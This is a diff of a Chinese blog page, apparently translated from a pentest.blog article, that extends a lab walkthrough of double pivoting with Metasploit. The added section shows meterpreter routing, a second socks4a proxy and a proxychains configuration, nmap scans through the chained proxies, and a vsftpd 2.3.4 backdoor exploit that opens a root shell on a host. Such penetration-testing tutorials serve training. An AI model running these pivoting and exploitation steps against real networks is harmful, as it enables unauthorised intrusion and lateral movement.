@@ -121,7 +121,7 @@
 
       <div class="read-time">
         <small>
-          9 minute read
+          13 minute read
         </small>
       </div>
 
@@ -195,7 +195,7 @@ IPv4 Netmask : 255.255.255.0
 中的模块不能访问到7.7.7.x网段,msf中的模块所处的ip是攻击者的ip,meterpreter shell所处的ip是RD的ip.在meterpreter中
 添加路由的目的是为了给msf模块作代理,也即给Attacker作代理,但是只能给Attacker的msf模块作代理,要想给Attacker的其他
 应用程序作代理,则需要在meterpreter添加路由后再运行msf的开启sock4的模块,然后再用proxychains来设置Attacker的其他
-应用程序的代理为msf中设置的代理入口.
+应用程序的代理为msf的开启sock4代理模块中设置的代理入口.
 </font>
 <p>操作如下:</p>
 <div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; run autoroute -s 7.7.7.0/24
@@ -308,8 +308,8 @@ root@kali:~#
 不在同一网段,此处有个要注意的内容:</p>
 <font color="red">Attention:</font>
 <font color="#33ccff">
-可以选择使用proxychains设置Attacker的浏览器的代理为RD在Attacker的1080端口上绑定[开启]的socks4代理入口[认为msf中的
-auxiliary/server/socks4a模块类似于ssh反向代理],也可通过在RD的meterpreter会话中运行portfwd模块命令,portfwd命令如下:
+可以选择使用proxychains设置Attacker的浏览器的代理为Attacker的1080端口的socks4代理入口,也可通过在RD的meterpreter会
+话中运行portfwd模块命令,portfwd命令如下:
 </font>
 <div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; portfwd add -L 172.16.0.20 -l 2323 -p 80 -r 7.7.7.20
 [*] Local TCP relay created: 172.16.0.20:2323 &lt;-&gt; 7.7.7.20:80
@@ -561,7 +561,160 @@ IPv4 Netmask : 255.255.255.0
 meterpreter &gt;
 </code></pre>
 </div>
-<p>发现又出现一个8.8.8.x的网段,于是将这个网段添加路由</p>
+<p>发现又出现一个8.8.8.x的网段,于是将这个网段添加路由,以便msf中的模块可以访问到8.8.8.x网段</p>
+
+<h3 id="step3">Step3</h3>
+
+<p>先直接用新的meterpreter shell看看8.8.8.x这个网段有什么机器</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=8.8.8.0/24
+[*] Running module against SRV03
+[*] ARP Scanning 8.8.8.0/24
+[*]   IP: 8.8.8.3 MAC 08:00:27:29:cd:cb (CADMUS COMPUTER SYSTEMS)
+[*]   IP: 8.8.8.1 MAC 0a:00:27:00:00:03 (UNKNOWN)
+[*]   IP: 8.8.8.9 MAC 08:00:27:56:f1:7c (CADMUS COMPUTER SYSTEMS)
+[*]    IP: 8.8.8.13 MAC 08:00:27:13:a3:b1 (CADMUS COMPUTER SYSTEMS)
+</code></pre>
+</div>
+
+<p>为了让msf中所有模块都能访问到8.8.8.x网段,在新的meterpreter会话中添加路由:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; run autoroute -s 8.8.8.0/24
+[*] Adding a route to 8.8.8.0/255.255.255.0...
+[+] Added route to 8.8.8.0/255.255.255.0 via 7.7.7.20
+[*] Use the -p option to list all active routes
+</code></pre>
+</div>
+
+<p>为了让Attacker的除了msf模块以外的其他应用程序能访问到8.8.8.x网段,再使用msf的开启sock4代理的模块开启另外一个端口
+作为8.8.8.x网段的入口:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>msf exploit(ms08_067_netapi) &gt; use auxiliary/server/socks4a 
+msf auxiliary(socks4a) &gt; show options 
+Module options (auxiliary/server/socks4a):
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  172.16.0.20      yes       The address to listen on
+   SRVPORT  1080             yes       The port to listen on.
+Auxiliary action:
+   Name   Description
+   ----   -----------
+   Proxy  
+msf auxiliary(socks4a) &gt; set SRVPORT 1081
+SRVPORT =&gt; 1081
+msf auxiliary(socks4a) &gt; run
+[*] Auxiliary module execution completed
+[*] Starting the socks4a proxy server
+msf auxiliary(socks4a) &gt;
+</code></pre>
+</div>
+<p>也即现在Attacker本地的1080端口的代理可以访问到7.7.7.x网段,1081端口的代理可以访问到8.8.8.x网段,然后将新开的端口
+添加到proxychains的配置文件中:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# cat /etc/proxychains.conf | grep -v "#"
+dynamic_chain
+proxy_dns 
+tcp_read_time_out 15000
+tcp_connect_time_out 8000
+socks4  172.16.0.20 1080  # First Pivot
+socks4  172.16.0.20 1081  # Second Pivot
+</code></pre>
+</div>
+<p>上面的两个代理相当于扇门的钥匙,172.16.0.20:1080是7.7.7.x的钥匙,172.16.0.20:1081是7.7.7.x后面的8.8.8.x的钥匙
+,Attacker要想访问到8.8.8.x可以通过先打开7.7.7.x的门,再打开8.8.8.x的门(因为8.8.8.x这个门在7.7.7.x这个门之后)</p>
+
+<p>使用Attacker本地的nmap扫描下8.8.8.x网段:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# proxychains nmap -sT -sV -p21,22,23,80 8.8.8.9 -n -Pn -vv
+ProxyChains-3.1 (http://proxychains.sf.net)
+Starting Nmap 7.25BETA1 ( https://nmap.org )
+Nmap wishes you a merry Christmas! Specify -sX for Xmas Scan (https://nmap.org/book/man-port-scanning-techniques.html).
+NSE: Loaded 36 scripts for scanning.
+Initiating Connect Scan
+Scanning 8.8.8.9 [4 ports]
+|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:21-&lt;&gt;&lt;&gt;-OK
+Discovered open port 21/tcp on 8.8.8.9
+|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:23-&lt;&gt;&lt;&gt;-OK
+Discovered open port 23/tcp on 8.8.8.9
+|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:22-&lt;&gt;&lt;&gt;-OK
+Discovered open port 22/tcp on 8.8.8.9
+|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK
+Discovered open port 80/tcp on 8.8.8.9
+Completed Connect Scan at 05:54, 1.37s elapsed (4 total ports)
+Initiating Service scan at 05:54
+Scanning 4 services on 8.8.8.9
+|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:21-&lt;&gt;&lt;&gt;-OK
+|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:22-&lt;&gt;&lt;&gt;-OK
+|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:23-&lt;&gt;&lt;&gt;-OK
+|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK
+Completed Service scan at 05:54, 11.09s elapsed (4 services on 1 host)
+NSE: Script scanning 8.8.8.9.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 05:54
+|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK
+|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK
+Completed NSE at 05:54, 1.71s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 05:54
+Completed NSE at 05:54, 0.00s elapsed
+Nmap scan report for 8.8.8.9
+Host is up, received user-set (0.41s latency).
+Scanned 
+PORT   STATE SERVICE REASON  VERSION
+21/tcp open  ftp     syn-ack vsftpd 2.3.4
+22/tcp open  ssh     syn-ack OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp open  telnet  syn-ack Linux telnetd
+80/tcp open  http    syn-ack Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.59 seconds
+root@kali:~#
+</code></pre>
+</div>
+<p>发现8.8.8.9(SK)这台机器可能有漏洞,用msf模块尝试getshell:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>msf &gt; 
+msf &gt; use exploit/unix/ftp/vsftpd_234_backdoor 
+msf exploit(vsftpd_234_backdoor) &gt; show options 
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST                   yes       The target address
+   RPORT  21               yes       The target port
+Exploit target:
+   Id  Name
+   --  ----
+   0   Automatic
+msf exploit(vsftpd_234_backdoor) &gt; set rhost 8.8.8.9
+rhost =&gt; 8.8.8.9
+msf exploit(vsftpd_234_backdoor) &gt; run
+[*] 8.8.8.9:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 8.8.8.9:21 - USER: 331 Please specify the password.
+[+] 8.8.8.9:21 - Backdoor service has been spawned, handling...
+[+] 8.8.8.9:21 - UID: uid=0(root) gid=0(root)
+[*] Found shell.
+[*] Command shell session 4 opened (Local Pipe -&gt; Remote Pipe) 
+pwd
+/
+id
+uid=0(root) gid=0(root)
+ifconfig
+eth0      Link encap:Ethernet  HWaddr 08:00:27:56:f1:7c  
+          inet addr:8.8.8.9  Bcast:8.8.8.255  Mask:255.255.255.0
+          inet6 addr: fe80::a00:27ff:fe56:f17c/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:10843 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:2779 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:1081842 (1.0 MB)  TX bytes:661455 (645.9 KB)
+          Base address:0xd010 Memory:f0000000-f0020000 
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:18161 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:18161 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:5307479 (5.0 MB)  TX bytes:5307479 (5.0 MB)
+</code></pre>
+</div>
+
+<p>翻译自:https://pentest.blog/explore-hidden-networks-with-double-pivoting/</p>
 </span>
 
         
